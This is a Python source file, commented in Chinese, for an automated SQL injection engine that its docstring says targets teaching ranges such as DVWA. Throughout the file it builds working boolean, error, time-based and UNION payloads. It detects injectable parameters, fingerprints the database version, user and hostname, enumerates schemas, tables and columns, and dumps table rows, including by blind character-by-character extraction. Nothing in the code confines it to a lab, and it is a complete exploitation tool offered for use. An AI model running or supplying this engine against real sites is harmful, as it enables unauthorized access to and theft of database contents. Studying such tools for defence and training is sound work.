# -*- coding: utf-8 -*-
"""SQL 注入引擎（MySQL / MariaDB，面向 DVWA 等教学靶场）。

相比原始脚本的升级点：
1. 自动识别引号上下文与注释符，支持布尔 / 报错 / 时间三种检测；
2. 使用唯一标记 ~z~ 精确回显提取，不再依赖 "First name" 之类正则猜测；
3. GROUP_CONCAT 批量枚举，一次请求拿整份库名/表名/列名；
4. 全流程可中断、可观测，每一步都有证据与请求计数。
"""

import html
import random
import re
import string
from urllib.parse import urljoin

from .forms import parse_forms
from .httpclient import HTTPError, Resp, similarity

SQL_ERRORS = [
    "you have an error in your sql syntax",
    "warning: mysql",
    "unclosed quotation mark",
    "quoted string not properly terminated",
    "microsoft ole db",
    "odbc sql server driver",
    "postgresql",
    "sqlite error",
    "sqlstate",
    "mysql_fetch",
    "mysqli_fetch",
    "unknown column",
    "sql syntax",
    "ora-0",
]

WAF_HINTS = ["access denied", "request blocked", "mod_security", "cloudflare", "not acceptable"]

MARK_START = "~z~"
MARK_RE = re.compile(r"~z~(.*?)~z~", re.S)
SEP = "|;;|"
SEP_HEX = "0x7c3b3b7c"


def _hex(text: str) -> str:
    return "0x" + text.encode("utf-8").hex()


def _ident(name: str) -> str:
    return "`" + name.replace("`", "``") + "`"


def _rand_token(n: int = 5) -> str:
    return "".join(random.choices(string.ascii_lowercase + string.digits, k=n))


class SqliEngine:
    def __init__(self, agent, task):
        self.a = agent
        self.t = task
        self._mode_checked = False
        self._session_url = None
        self._oracle = None

    def _detect_mode(self, param: str):
        """自动适配 High 的 session-input 或 Medium 的 POST 表单。"""
        if self._mode_checked:
            return
        self._mode_checked = True
        try:
            page = self.a.raw("GET", self.a.base, params=self.a.query or None)
        except HTTPError:
            return
        hint = next((name for name in ("session-input.php", "cookie-input.php")
                     if name in page.text), None)
        if hint or page.length < 800:
            candidates = [hint] if hint else ["session-input.php", "cookie-input.php"]
            for name in candidates:
                candidate = urljoin(page.url, name)
                try:
                    probe = self.a.raw("GET", candidate)
                except HTTPError:
                    continue
                if probe.status == 200 and 'name="id"' in probe.text:
                    self._session_url = candidate
                    try:
                        self.a.raw("POST", candidate,
                                   data={"id": "1", "Submit": "Submit"})
                    except HTTPError:
                        pass
                    self.t.info(f"识别到 High 模式（{name}）：已重置 ID 并接管注入")
                    return
        forms = parse_forms(page.text, page.url)
        form = next((item for item in forms if param in item["fields"]), None)
        if form and form["method"] == "POST":
            self.a.method = "POST"
            self.a.form.update(form["fields"])
            self.t.info(f"自动跟随 POST 表单：{form['action']} · "
                        f"字段 {', '.join(form['names'])}")

    def _send(self, param: str, value: str, timeout: float | None = None) -> Resp:
        self._detect_mode(param)
        if self._session_url:
            self.a.raw("POST", self._session_url,
                       data={param: value, "Submit": "Submit"}, timeout=timeout)
            return self.a.raw("GET", self.a.base, params=self.a.query or None, timeout=timeout)
        return self.a.send({param: value}, timeout=timeout)

    # ---------- 基础判定 ----------
    @staticmethod
    def is_error(resp: Resp, baseline: Resp | None = None) -> bool:
        low = resp.text.lower()
        if any(k in low for k in SQL_ERRORS):
            return True
        if resp.status >= 500:
            return True
        if baseline and baseline.length > 200:
            if resp.length < baseline.length * 0.35 and similarity(resp.text, baseline.text) < 0.6:
                return True
        return False

    @staticmethod
    def waf_blocked(resp: Resp) -> bool:
        low = resp.text.lower()
        return resp.status in (403, 406, 429, 503) or any(h in low for h in WAF_HINTS)

    @staticmethod
    def quote_label(quote: str) -> str:
        return {"'": "单引号", '"': "双引号", "": "数字型"}.get(quote, quote or "数字型")

    def _boolean_payloads(self, quote: str, suffix: str):
        if quote:
            return (
                f"1{quote} AND {quote}1{quote}={quote}1{quote}{suffix}",
                f"1{quote} AND {quote}1{quote}={quote}2{quote}{suffix}",
            )
        return (f"1 AND 1=1{suffix}", f"1 AND 1=2{suffix}")

    # ---------- 漏洞探测 ----------
    def probe(self, params: list[str]) -> dict:
        base = self._send(params[0], "1")
        if base.status >= 400:
            self.t.warn(f"基线响应状态码 {base.status}，请确认目标可访问")
        if "login.php" in base.url.lower():
            self.t.warn("响应跳转到登录页，Cookie 可能已失效，请先在靶场登录后复制新的 PHPSESSID")
        self.t.info(f"基线：HTTP {base.status} / {base.length} 字节 / {base.elapsed * 1000:.0f} ms")

        findings: list[dict] = []
        for param in params:
            self.t.check_stop()
            self.t.log(f"探测参数 [{param}]", "step")
            for quote in ("'", '"', ""):
                self.t.check_stop()
                label = self.quote_label(quote)
                hit = None
                for suffix in ("-- -", "#"):
                    for attempt in range(2):
                        try:
                            true_p, false_p = self._boolean_payloads(quote, suffix)
                            if attempt == 1:
                                true_p, false_p = false_p, true_p
                            r_true = self._send(param, true_p)
                            r_false = self._send(param, false_p)
                        except HTTPError as exc:
                            self.t.err(str(exc))
                            return {"vulnerable": False, "findings": [], "error": str(exc),
                                    "baseline": self._brief(base)}
                        sim = similarity(r_true.text, r_false.text)
                        sim_t = similarity(r_true.text, base.text)
                        sim_f = similarity(r_false.text, base.text)
                        diff_len = abs(r_true.length - r_false.length)
                        if sim < 0.9985 and diff_len >= 5 and sim_t >= sim_f:
                            hit = {
                                "param": param,
                                "technique": "boolean",
                                "quote": quote,
                                "suffix": suffix,
                                "payload": true_p,
                                "evidence": {
                                    "true_length": r_true.length,
                                    "false_length": r_false.length,
                                    "similarity": round(sim, 5),
                                    "delta": diff_len,
                                },
                            }
                            self.t.ok(f"布尔盲注命中：{label} / 注释 {suffix!r}，"
                                      f"真 {r_true.length}B vs 假 {r_false.length}B（差异 {diff_len}B）")
                            break
                    if hit:
                        break

                if not hit:
                    # 报错型：先记录，继续尝试其它上下文，避免数字型被单引号误判
                    err_payload = f"1{quote}"
                    try:
                        r_err = self._send(param, err_payload)
                    except HTTPError:
                        r_err = None
                    if r_err is not None:
                        near = similarity(r_err.text, base.text) if base.text else 0
                        if self.is_error(r_err, base) and near < 0.98:
                            if not any(f["technique"] == "error" and f["param"] == param
                                       for f in findings):
                                findings.append({
                                    "param": param,
                                    "technique": "error",
                                    "quote": quote,
                                    "suffix": "-- -",
                                    "payload": err_payload,
                                    "evidence": {
                                        "status": r_err.status,
                                        "similarity": round(near, 4),
                                        "hint": self._error_hint(r_err),
                                    },
                                })
                                self.t.ok(f"报错型特征：{label}，{self._error_hint(r_err)}")
                        elif self.waf_blocked(r_err):
                            self.t.warn("目标返回拦截特征（WAF / 安全模块），payload 可能被过滤")

                if not hit:
                    # 时间型
                    delay = 2
                    time_payload = (f"1{quote} AND SLEEP({delay})-- -" if quote
                                    else f"1 AND SLEEP({delay})-- -")
                    try:
                        r_time = self._send(param, time_payload, timeout=self.a.timeout + delay)
                    except HTTPError:
                        continue
                    if r_time.elapsed > max(1.4, base.elapsed + 1.0):
                        hit = {
                            "param": param,
                            "technique": "time",
                            "quote": quote,
                            "suffix": "-- -",
                            "payload": time_payload,
                            "evidence": {
                                "baseline_ms": round(base.elapsed * 1000),
                                "payload_ms": round(r_time.elapsed * 1000),
                            },
                        }
                        self.t.ok(f"时间盲注命中：{label}，响应延迟 {r_time.elapsed:.2f}s")

                if hit:
                    findings.append(hit)
                    break
                self.t.info(f"{label} 未形成布尔 / 时间注入")

        if not findings:
            self.t.warn("未发现可用注入点。请检查参数名、Cookie 或靶场安全级别。")
            return {"vulnerable": False, "findings": [], "baseline": self._brief(base)}

        # 选择最优上下文：布尔 > 时间 > 报错
        priority = {"boolean": 0, "time": 1, "error": 2}
        findings.sort(key=lambda f: (priority.get(f["technique"], 9), f["param"]))
        best = findings[0]
        self.t.ok(f"选定注入上下文：参数 {best['param']} / {self.quote_label(best['quote'])} / "
                  f"{best['technique']}")
        return {
            "vulnerable": True,
            "findings": findings,
            "best": best,
            "baseline": self._brief(base),
            "summary": f"发现 SQL 注入：参数 {best['param']}（{self.quote_label(best['quote'])}）",
            "severity": "high",
        }

    @staticmethod
    def _error_hint(resp: Resp) -> str:
        low = resp.text.lower()
        for k in SQL_ERRORS:
            if k in low:
                return k
        return "响应异常"

    @staticmethod
    def _brief(resp: Resp) -> dict:
        return {"status": resp.status, "length": resp.length,
                "elapsed_ms": round(resp.elapsed * 1000)}

    # ---------- payload 构造 ----------
    @staticmethod
    def _union(ctx: dict, select_expr: str) -> str:
        count = int(ctx["columns"])
        display = int(ctx["display"]) - 1
        cols = ["NULL"] * count
        cols[display] = select_expr
        return f"-1{ctx['quote']} UNION SELECT {','.join(cols)}{ctx['suffix']}"

    def _fetch(self, ctx: dict, expr: str) -> str | None:
        marked = (f"CONCAT(CHAR(126,122,126),"
                  f"IFNULL(CAST(({expr}) AS CHAR),CHAR(78,85,76,76)),CHAR(126,122,126))")
        payload = self._union(ctx, marked)
        try:
            resp = self._send(ctx["param"], payload)
        except HTTPError as exc:
            self.t.err(str(exc))
            return None
        if self.is_error(resp):
            return None
        match = MARK_RE.search(resp.text)
        if not match:
            return None
        value = match.group(1).strip()
        return value

    def _fetch_list(self, ctx: dict, expr: str, from_clause: str,
                    max_items: int = 40) -> list[str]:
        items: list[str] = []
        bulk = self._fetch(ctx, f"(SELECT GROUP_CONCAT({expr} SEPARATOR {SEP_HEX}) FROM {from_clause})")
        if bulk and bulk != "NULL":
            for part in bulk.split(SEP):
                part = part.strip()
                if part and part not in items:
                    items.append(part)
            if items:
                self.t.data(f"批量枚举 {len(items)} 项")
                return items
        self.t.info("批量枚举不可用，回退逐条枚举")
        for index in range(max_items):
            self.t.check_stop()
            value = self._fetch(ctx, f"(SELECT {expr} FROM {from_clause} LIMIT {index},1)")
            if not value or value == "NULL" or value in items:
                break
            items.append(value)
            self.t.data(f"[{len(items)}] {value}")
        return items

    # ---------- 列数 / 回显列 ----------
    def marker_scan(self, ctx: dict, max_cols: int = 15) -> dict | None:
        """用带唯一标记的 UNION 直接扫列数并定位回显列（错误页不回显时更可靠）。"""
        self.t.info("使用 UNION 标记扫描列数…")
        for count in range(1, max_cols + 1):
            self.t.check_stop()
            tokens = [f"qz{_rand_token(4)}{i}" for i in range(count)]
            payload = (f"-1{ctx['quote']} UNION SELECT "
                       f"{','.join(chr(39) + token + chr(39) for token in tokens)}{ctx['suffix']}")
            try:
                resp = self._send(ctx["param"], payload)
            except HTTPError:
                continue
            hits = [index for index, token in enumerate(tokens, 1) if token in resp.text]
            if len(hits) == count:
                self.t.ok(f"标记扫描确认列数 {count}，回显列 {hits}")
                return {"columns": count, "display": hits[0], "display_all": hits}
        return None

    def count_columns(self, ctx: dict, max_cols: int = 20) -> dict:
        self.t.step_msg("探测查询列数（ORDER BY）")
        prefix = f"-1{ctx['quote']}"
        count = 0
        for n in range(1, max_cols + 1):
            self.t.check_stop()
            payload = f"{prefix} ORDER BY {n}{ctx['suffix']}"
            try:
                resp = self._send(ctx["param"], payload)
            except HTTPError as exc:
                self.t.err(str(exc))
                break
            if self.is_error(resp):
                count = n - 1
                self.t.ok(f"ORDER BY {n} 触发错误 → 列数 = {count}")
                break
            self.t.info(f"ORDER BY {n} 正常（{resp.length}B）")
            count = n

        if count <= 0:
            self.t.warn("ORDER BY 未得出结论，改用 UNION 逐列验证")
            count = self._union_scan(ctx)
        if count <= 0:
            raise RuntimeError("无法确定列数，目标可能未使用 UNION 可注入查询")

        verified = self._verify_union(ctx, count)
        if (not verified) or count > 15:
            self.t.warn(f"UNION {count} 列验证异常，改用标记扫描")
            scan = self.marker_scan(ctx)
            if scan:
                ctx["columns"] = scan["columns"]
                ctx["display"] = scan["display"]
                ctx["display_all"] = scan["display_all"]
                return {"columns": scan["columns"], "verified": True,
                        "display": scan["display"]}
            raise RuntimeError("UNION 标记扫描未能确认列数，该目标可能只能盲注")
        ctx["columns"] = count
        self.t.ok(f"确认列数：{count}")
        return {"columns": count, "verified": verified}

    def _union_scan(self, ctx: dict, max_cols: int = 20) -> int:
        for n in range(1, max_cols + 1):
            self.t.check_stop()
            payload = f"-1{ctx['quote']} UNION SELECT {','.join(['NULL'] * n)}{ctx['suffix']}"
            try:
                resp = self._send(ctx["param"], payload)
            except HTTPError:
                continue
            if not self.is_error(resp):
                self.t.ok(f"UNION {n} 列无报错")
                return n
        return 0

    def _verify_union(self, ctx: dict, count: int) -> bool:
        payload = f"-1{ctx['quote']} UNION SELECT {','.join(['NULL'] * count)}{ctx['suffix']}"
        try:
            resp = self._send(ctx["param"], payload)
        except HTTPError:
            return False
        return not self.is_error(resp)

    def find_display(self, ctx: dict) -> dict:
        if ctx.get("display"):
            self.t.info(f"沿用标记扫描结果：第 {ctx['display']} 列可回显")
            return {"display": ctx["display"],
                    "display_all": ctx.get("display_all", [ctx["display"]])}
        self.t.step_msg("定位可回显列")
        count = int(ctx["columns"])
        tokens = [f"qz{_rand_token(4)}{i}" for i in range(count)]
        payload = (f"-1{ctx['quote']} UNION SELECT "
                   f"{','.join(chr(39) + t + chr(39) for t in tokens)}{ctx['suffix']}")
        try:
            resp = self._send(ctx["param"], payload)
        except HTTPError as exc:
            raise RuntimeError(str(exc)) from exc

        shown = []
        for idx, token in enumerate(tokens, 1):
            if token in resp.text:
                shown.append(idx)
        if not shown:
            self.t.warn("未找到回显列，尝试数字标记回退")
            nums = [str(i) for i in range(1, count + 1)]
            payload = (f"-1{ctx['quote']} UNION SELECT "
                       f"{','.join(nums)}{ctx['suffix']}")
            resp = self._send(ctx["param"], payload)
            for idx, num in enumerate(nums, 1):
                if re.search(rf">\s*{num}\s*<", resp.text):
                    shown.append(idx)
        if not shown:
            raise RuntimeError("UNION 查询成功但数据未回显，可能需要盲注或页面不展示该列")

        ctx["display"] = shown[0]
        ctx["display_all"] = shown
        self.t.ok(f"可回显列：{shown}，使用第 {shown[0]} 列提取数据")
        return {"display": shown[0], "display_all": shown}

    # ---------- 布尔盲注提取 ----------
    @staticmethod
    def _strip_payload(text: str, payload: str) -> str:
        variants = {
            payload,
            payload.replace("'", "&#039;"),
            payload.replace("'", "&#x27;"),
            payload.replace('"', "&quot;"),
            html.escape(payload, quote=True),
        }
        for variant in sorted(variants, key=len, reverse=True):
            if variant:
                text = text.replace(variant, "")
        return text

    @staticmethod
    def _blind_payload(ctx: dict, cond: str) -> str:
        if ctx["quote"]:
            return f"1{ctx['quote']} AND ({cond}){ctx['suffix']}"
        return f"1 AND ({cond}){ctx['suffix']}"

    def _blind_prepare(self, ctx: dict):
        true_p, false_p = self._boolean_payloads(ctx["quote"], ctx["suffix"])
        r_true = self._send(ctx["param"], true_p)
        r_false = self._send(ctx["param"], false_p)
        text_true = self._strip_payload(r_true.text, true_p)
        text_false = self._strip_payload(r_false.text, false_p)
        sim = similarity(text_true, text_false)
        if sim > 0.9995:
            raise RuntimeError(
                "真 / 假响应差异过小，无法建立盲注判据（可先用 UNION 模式，或降低靶场过滤级别）")
        self._oracle = (text_true, len(text_true), text_false, len(text_false), sim)
        self.t.info(f"盲注判据建立：真 {len(text_true)}B / 假 {len(text_false)}B / "
                    f"相似度 {sim:.4f}")

    def _blind_test(self, ctx: dict, cond: str) -> bool:
        payload = self._blind_payload(ctx, cond)
        resp = self._send(ctx["param"], payload)
        text = self._strip_payload(resp.text, payload)
        base_true, len_true, base_false, len_false, _ = self._oracle
        sim_true = similarity(text, base_true)
        sim_false = similarity(text, base_false)
        if abs(sim_true - sim_false) < 1e-6:
            return abs(len(text) - len_true) <= abs(len(text) - len_false)
        return sim_true > sim_false

    def _blind_int(self, ctx: dict, expr: str, low: int = 0, high: int = 255) -> int:
        lo, hi = low, high
        while lo < hi:
            self.t.check_stop()
            mid = (lo + hi) // 2
            if self._blind_test(ctx, f"({expr})>{mid}"):
                lo = mid + 1
            else:
                hi = mid
        return lo

    def _time_test(self, ctx: dict, cond: str, delay: float = 1.0) -> bool:
        if ctx["quote"]:
            payload = f"1{ctx['quote']} AND IF(({cond}),SLEEP({delay}),0){ctx['suffix']}"
        else:
            payload = f"1 AND IF(({cond}),SLEEP({delay}),0){ctx['suffix']}"
        resp = self._send(ctx["param"], payload, timeout=self.a.timeout + delay + 3)
        return resp.elapsed >= delay * 0.6

    def _time_int(self, ctx: dict, expr: str, delay: float,
                  low: int = 0, high: int = 255) -> int:
        lo, hi = low, high
        while lo < hi:
            self.t.check_stop()
            mid = (lo + hi) // 2
            if self._time_test(ctx, f"({expr})>{mid}", delay):
                lo = mid + 1
            else:
                hi = mid
        return lo

    def blind_fetch(self, ctx: dict, expr: str, max_len: int = 32,
                    mode: str = "boolean", delay: float = 1.0,
                    quiet: bool = False) -> dict:
        start_requests = self.a.requests_sent
        timer = mode == "time"
        if timer:
            self.t.step_msg(f"时间盲注模式（每字符约 {delay:.1f}s）")
            self.t.info("使用 IF(cond,SLEEP(n),0) 判定，慢但适用于无回显场景")
            probe = self._time_test(ctx, "1=1", delay)
            if not probe:
                raise RuntimeError("SLEEP 未生效，目标可能禁用时间函数或延迟过短")
            self.t.ok("时间判据建立：真条件出现明显延迟")
        elif self._oracle:
            self.t.info("复用已建立的布尔判据")
        else:
            self.t.step_msg("建立布尔盲注判据")
            self._blind_prepare(ctx)

        self.t.step_msg("读取目标长度")
        if timer:
            length = self._time_int(ctx, f"LENGTH(({expr}))", delay, 0, 255)
        else:
            length = self._blind_int(ctx, f"LENGTH(({expr}))", 0, 255)
        if length <= 0:
            if not quiet:
                self.t.warn("表达式返回空，可能条件不成立")
            return {"expression": expr, "value": "", "length": 0, "mode": mode,
                    "requests": self.a.requests_sent - start_requests}
        capped = min(length, max_len)
        if length > max_len:
            self.t.warn(f"实际长度 {length}，本次只提取前 {capped} 个字符")
        self.t.ok(f"结果长度：{length}")

        chars: list[str] = []
        for pos in range(1, capped + 1):
            self.t.check_stop()
            if self.a.requests_sent - start_requests > 6000:
                raise RuntimeError("盲注请求数超过 6000，已停止以避免打挂靶场")
            if timer:
                code = self._time_int(ctx, f"ASCII(SUBSTR(({expr}),{pos},1))", delay, 32, 126)
            else:
                code = self._blind_int(ctx, f"ASCII(SUBSTR(({expr}),{pos},1))", 32, 126)
            chars.append(chr(code))
            value = "".join(chars)
            if not quiet:
                self.t.data(f"[{pos}/{capped}] {value}")
            self.t.set_progress(pos / capped, f"盲注 {pos}/{capped} 字符")

        value = "".join(chars)
        used = self.a.requests_sent - start_requests
        self.t.ok(f"盲注完成：{value}（{used} 次请求）")
        return {"expression": expr, "value": value, "length": length, "mode": mode,
                "truncated": length > capped, "requests": used}

    # ---------- 盲注拖库 ----------
    def _blind_text(self, ctx: dict, expr: str, mode: str, delay: float,
                    max_chars: int = 120) -> str:
        """用 HEX() 包裹后盲注提取，避免非 ASCII 字符被截断。"""
        res = self.blind_fetch(ctx, f"HEX(({expr}))", max_len=max_chars * 4,
                               mode=mode, delay=delay, quiet=True)
        raw = (res.get("value") or "").strip()
        if not raw:
            return ""
        try:
            text = bytes.fromhex(raw).decode("utf-8", "replace")
        except ValueError:
            text = raw
        if text:
            self.t.data(f"取值：{text[:120]}")
        return text

    def _blind_count(self, ctx: dict, expr: str, mode: str, delay: float,
                     high: int = 9999) -> int:
        if mode == "time":
            return self._time_int(ctx, expr, delay, 0, high)
        if not self._oracle:
            self._blind_prepare(ctx)
        return self._blind_int(ctx, expr, 0, high)

    def _blind_list(self, ctx: dict, expr: str, mode: str, delay: float,
                    max_chars: int = 200) -> list[str]:
        text = self._blind_text(ctx, expr, mode, delay, max_chars)
        return [part.strip() for part in text.split(SEP) if part.strip()]

    def blind_databases(self, ctx: dict, mode: str = "boolean",
                        delay: float = 1.0) -> list[str]:
        self.t.step_msg("盲注枚举数据库")
        expr = (f"SELECT GROUP_CONCAT(schema_name SEPARATOR {SEP_HEX}) "
                f"FROM information_schema.schemata")
        items = self._blind_list(ctx, expr, mode, delay, max_chars=240)
        self.t.ok(f"共 {len(items)} 个数据库：{', '.join(items[:8])}")
        return items

    def blind_tables(self, ctx: dict, database: str, mode: str = "boolean",
                     delay: float = 1.0) -> list[str]:
        self.t.step_msg(f"盲注枚举 {database} 的表")
        expr = (f"SELECT GROUP_CONCAT(table_name SEPARATOR {SEP_HEX}) "
                f"FROM information_schema.tables WHERE table_schema={_hex(database)}")
        items = self._blind_list(ctx, expr, mode, delay, max_chars=240)
        self.t.ok(f"{database} 共 {len(items)} 张表")
        return items

    def blind_columns(self, ctx: dict, database: str, table: str,
                      mode: str = "boolean", delay: float = 1.0) -> list[str]:
        self.t.step_msg(f"盲注枚举 {database}.{table} 的字段")
        expr = (f"SELECT GROUP_CONCAT(column_name SEPARATOR {SEP_HEX}) "
                f"FROM information_schema.columns WHERE table_schema={_hex(database)} "
                f"AND table_name={_hex(table)}")
        items = self._blind_list(ctx, expr, mode, delay, max_chars=240)
        self.t.ok(f"{table} 共 {len(items)} 个字段")
        return items

    def blind_dump(self, ctx: dict, database: str, table: str,
                   columns: list[str] | None = None, rows: int = 3,
                   mode: str = "boolean", delay: float = 1.0,
                   col_limit: int = 5, row_chars: int = 120) -> dict:
        start = self.a.requests_sent
        from_clause = f"{_ident(database)}.{_ident(table)}"
        if not columns:
            columns = self.blind_columns(ctx, database, table, mode, delay)
        if not columns:
            raise RuntimeError(f"{table} 没有可用字段")
        if len(columns) > col_limit:
            self.t.warn(f"字段 {len(columns)} 个，本次只取前 {col_limit} 个以控制请求量")
            columns = columns[:col_limit]

        total = self._blind_count(ctx, f"(SELECT COUNT(*) FROM {from_clause})",
                                  mode, delay, high=9999)
        self.t.info(f"表内记录数：{total}")
        rows = min(rows, total) if total else rows
        self.t.warn(f"盲注每字符约 7 次请求，{rows} 行 × {len(columns)} 字段的请求量会比较大；"
                    f"布尔模式建议延迟 0.02s")

        # 用十六进制字面量代替 'NULL'，避免 medium / high 把单引号转义导致语法错误
        parts = [f"IFNULL(CAST({_ident(col)} AS CHAR),0x4e554c4c)" for col in columns]
        row_expr = f"SELECT CONCAT_WS({SEP_HEX},{','.join(parts)}) FROM {from_clause} LIMIT {{i}},1"
        records = []
        for index in range(rows):
            self.t.check_stop()
            text = self._blind_text(ctx, row_expr.format(i=index), mode, delay, row_chars)
            if not text:
                self.t.warn(f"第 {index + 1} 行未取到数据，结束")
                break
            pieces = text.split(SEP)
            record = {col: (pieces[i] if i < len(pieces) else "") for i, col in enumerate(columns)}
            records.append(record)
            self.t.data(f"row {index + 1}: {text[:120]}")
            self.t.set_progress((index + 1) / max(rows, 1), f"盲注导出 {index + 1}/{rows} 行")

        used = self.a.requests_sent - start
        self.t.ok(f"盲注导出完成：{len(records)} 行（{used} 次请求）")
        return {"database": database, "table": table, "columns": columns,
                "rows": records, "total_rows": total, "requests": used}

    def blind_dump_db(self, ctx: dict, database: str, mode: str = "boolean",
                      delay: float = 1.0, rows: int = 2, max_tables: int = 5,
                      col_limit: int = 5) -> dict:
        start = self.a.requests_sent
        table_list = self.blind_tables(ctx, database, mode, delay)
        if not table_list:
            raise RuntimeError(f"{database} 中没有可枚举的表")
        selected = table_list[:max_tables]
        if len(table_list) > max_tables:
            self.t.warn(f"共 {len(table_list)} 张表，本次只处理前 {max_tables} 张")
        collected = []
        total = 0
        for index, table in enumerate(selected, 1):
            self.t.check_stop()
            self.t.info(f"[{index}/{len(selected)}] 盲注导出 {table}")
            try:
                data = self.blind_dump(ctx, database, table, rows=rows, mode=mode,
                                       delay=delay, col_limit=col_limit)
                collected.append({"table": table, "columns": data["columns"],
                                  "rows": data["rows"], "total_rows": data["total_rows"]})
                total += len(data["rows"])
            except Exception as exc:  # noqa: BLE001
                self.t.warn(f"{table} 导出失败：{exc}")
        used = self.a.requests_sent - start
        self.t.ok(f"盲注整库完成：{len(collected)} 张表 / {total} 行 / {used} 次请求")
        return {"database": database, "tables": collected, "total_rows": total,
                "requests": used}

    # ---------- 信息收集 ----------
    def fingerprint(self, ctx: dict) -> dict:
        self.t.step_msg("读取数据库指纹")
        info = {}
        queries = {
            "version": "VERSION()",
            "current_db": "DATABASE()",
            "current_user": "USER()",
            "hostname": "@@hostname",
            "charset": "@@character_set_database",
        }
        for key, expr in queries.items():
            self.t.check_stop()
            value = self._fetch(ctx, expr)
            info[key] = value if value and value != "NULL" else "未知"
            self.t.data(f"{key:12s} = {info[key]}")
        info["requests"] = self.a.requests_sent
        return info

    def databases(self, ctx: dict) -> list[str]:
        self.t.step_msg("枚举数据库")
        items = self._fetch_list(ctx, "schema_name", "information_schema.schemata")
        self.t.ok(f"共 {len(items)} 个数据库")
        return items

    def tables(self, ctx: dict, database: str) -> list[str]:
        self.t.step_msg(f"枚举 {database} 的表")
        where = f"information_schema.tables WHERE table_schema={_hex(database)}"
        items = self._fetch_list(ctx, "table_name", where)
        self.t.ok(f"{database} 共 {len(items)} 张表")
        return items

    def columns(self, ctx: dict, database: str, table: str) -> list[str]:
        self.t.step_msg(f"枚举 {database}.{table} 的字段")
        where = (f"information_schema.columns WHERE table_schema={_hex(database)} "
                 f"AND table_name={_hex(table)}")
        items = self._fetch_list(ctx, "column_name", where, max_items=60)
        self.t.ok(f"{table} 共 {len(items)} 个字段")
        return items

    def dump(self, ctx: dict, database: str, table: str,
             columns: list[str], limit: int = 10) -> dict:
        self.t.step_msg(f"导出 {database}.{table}")
        from_clause = f"{_ident(database)}.{_ident(table)}"
        total_raw = self._fetch(ctx, f"(SELECT COUNT(*) FROM {from_clause})")
        try:
            total = int(str(total_raw).strip())
        except (TypeError, ValueError):
            total = 0
        self.t.info(f"表内记录数：{total if total else '未知'}")

        rows = min(total or limit, limit)
        if not columns:
            raise RuntimeError("缺少字段列表，无法导出")
        if len(columns) > 12:
            self.t.warn(f"字段较多（{len(columns)}），只导出前 12 个以控制请求量")
            columns = columns[:12]

        select_parts = []
        for col in columns:
            select_parts.append(f"IFNULL(CAST({_ident(col)} AS CHAR),0x4e554c4c)")
        row_expr = f"CONCAT_WS({SEP_HEX},{','.join(select_parts)})"

        records = []
        for index in range(rows):
            self.t.check_stop()
            value = self._fetch(ctx, f"(SELECT {row_expr} FROM {from_clause} LIMIT {index},1)")
            if value is None:
                self.t.warn(f"第 {index + 1} 行读取失败，跳过")
                continue
            parts = value.split(SEP)
            record = {}
            for i, col in enumerate(columns):
                record[col] = parts[i] if i < len(parts) else ""
            records.append(record)
            self.t.data(f"row {index + 1}: {value[:160]}")
            self.t.set_progress((index + 1) / max(rows, 1),
                                f"导出 {index + 1}/{rows} 行")

        self.t.ok(f"已导出 {len(records)} 行")
        return {"database": database, "table": table, "columns": columns,
                "rows": records, "total_rows": total, "truncated": bool(total and total > rows)}

    def dump_all(self, ctx: dict, database: str, limit: int = 5,
                 max_tables: int = 15) -> dict:
        self.t.step_msg(f"整库导出：{database}")
        tables = self.tables(ctx, database)
        if not tables:
            raise RuntimeError(f"{database} 中没有可导出的表")
        selected = tables[:max_tables]
        if len(tables) > max_tables:
            self.t.warn(f"共 {len(tables)} 张表，本次只处理前 {max_tables} 张")
        collected = []
        total = 0
        for index, table in enumerate(selected, 1):
            self.t.check_stop()
            self.t.info(f"[{index}/{len(selected)}] 导出 {table}")
            try:
                fields = self.columns(ctx, database, table)
                if not fields:
                    self.t.warn(f"{table} 无字段信息，跳过")
                    continue
                data = self.dump(ctx, database, table, fields, limit=limit)
                collected.append({"table": table, "columns": data["columns"],
                                  "rows": data["rows"], "total_rows": data["total_rows"]})
                total += len(data["rows"])
            except Exception as exc:  # noqa: BLE001
                self.t.warn(f"{table} 导出失败：{exc}")
            self.t.set_progress(index / len(selected), f"{index}/{len(selected)} 张表")
        self.t.ok(f"整库导出完成：{len(collected)} 张表 / {total} 行")
        return {"database": database, "tables": collected, "total_rows": total}

    def custom(self, ctx: dict, expr: str) -> str | None:
        self.t.step_msg("执行自定义表达式")
        self.t.data(f"expr = {expr}")
        value = self._fetch(ctx, expr)
        self.t.ok(f"结果：{value}")
        return value
